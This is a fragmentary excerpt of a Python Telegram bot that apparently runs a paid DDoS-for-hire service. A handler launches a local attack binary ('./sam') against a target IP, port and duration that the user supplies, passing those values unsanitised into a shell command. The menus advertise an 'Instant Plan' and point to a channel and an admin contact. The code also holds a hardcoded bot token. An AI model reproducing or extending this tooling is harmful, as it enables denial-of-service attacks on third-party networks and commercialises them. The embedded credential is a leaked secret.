...
TOKEN = '7889670543:AAHXvyiWAlsKDZMXDv4LVLePDV7WXMHmbcs'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./sam {target_ip} {target_port} {duration} 90")
...
def send_welcome(message):
    ...
    btn5 = KeyboardButton("Channel Link❓")
    btn6 = KeyboardButton("Contact admin✔️")

    # Add buttons to the markup
    markup.add(btn2, btn5, btn6)
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.reply_to(message, "*https://t.me/l4dwale*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*Contact admin @Samy784*", parse_mode='Markdown')
    else:
